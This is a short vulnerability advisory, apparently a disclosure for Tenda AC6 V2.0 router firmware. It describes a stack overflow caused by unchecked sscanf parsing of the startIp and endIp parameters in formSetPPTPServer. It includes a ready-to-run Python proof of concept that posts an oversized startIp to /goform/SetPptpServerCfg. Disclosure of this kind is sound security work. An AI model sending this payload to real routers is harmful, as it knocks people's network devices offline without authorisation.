# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "formSetPPTPServer"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/2855)

In the function `formSetPPTPServer`, user-supplied input for the parameters **`startIp`** and **`endIp`** is assigned to variables on the stack using `sscanf` **without proper parameter validation**, leading to a **stack overflow**.

```c
sscanf(
             pptp_server_end_ip,
             "%[^.].%[^.].%[^.].%s",
             pptp_server_end_each_ip,
             pptp_server_end_each_ip[1],
             pptp_server_end_each_ip[2],
             pptp_server_end_each_ip[3]) != 4 )
```

![image-20250614185807558](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250614185807558.png)

poc

```python
import requests
def send_payload(url, startIp, endIp):
    params={'serverEn':1,
            'startIp':startIp,
            'endIp':endIp}
    cookie={'password':'vkntgb'}
    response = requests.post(url, cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

startIp=b'a'*0x2048+b".0.0.0"
endIp=b'a'
url="http://192.168.1.1/goform/SetPptpServerCfg"
send_payload(url, startIp,endIp)   
```

![image-20250614203518515](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250614203518515.png)